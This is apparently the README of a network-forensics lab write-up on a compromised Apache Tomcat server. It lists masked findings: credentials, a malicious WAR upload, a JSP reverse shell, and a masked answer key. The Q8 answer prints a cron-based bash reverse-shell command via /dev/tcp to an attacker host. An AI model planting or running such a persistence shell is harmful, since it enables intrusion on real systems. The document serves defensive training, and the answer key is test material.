# Tomcat Takeover Lab

Status: Completed  
Language: French primary, English mirror included

## Overview

This repository contains the final write-up and evidence notes for the **Tomcat Takeover Lab**.

The lab focuses on network forensic analysis of a compromised Apache Tomcat server using a PCAP file. The investigation identifies the attacker, the exposed service, the enumeration activity, the successful credentials, the malicious WAR upload, the deployed JSP reverse shell, and the persistence mechanism installed on the victim.

## Repository structure

```text
tomcat-takeover/
├── iocs-en.md
├── iocs.md
├── notes-en.md
├── notes.md
├── README_EN.md
├── README_TOMCAT_TAKEOVER_EN.md
├── README_TOMCAT_TAKEOVER.md
├── README.md
├── writeup-en.md
└── writeup-fr.md
```

## Main findings

| Item | Value |
|---|---|
| Victim | `**********` |
| Attacker | `**********` |
| Target service | Apache Tomcat on port `****` |
| Enumeration tool | `************` |
| Admin panel | `/*******` / `/*******/html` |
| Valid credentials | `*****:******` |
| Uploaded WAR | `******.***` |
| Malicious JSP | `********.***` |
| Deployed path | `/******/` |
| Reverse shell stream | `tcp.stream == ****` |
| Initial reverse shell | `**********:***** -> **********:80` |
| Persistence | Cron reverse shell to `**********:443` |
| Privilege observed | `****` |

## Final answers

| Question | Answer |
|---|---|
| Q1 | `**********` |
| Q2 | `*****` |
| Q3 | `****` |
| Q4 | `********` |
| Q5 | `/*******` |
| Q6 | `*****:******` |
| Q7 | `******.***` |
| Q8 | `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/*** 0>&1'` |

## Notes

This repository is intended for defensive learning, SOC practice, incident response documentation, and CTF/lab reporting only.
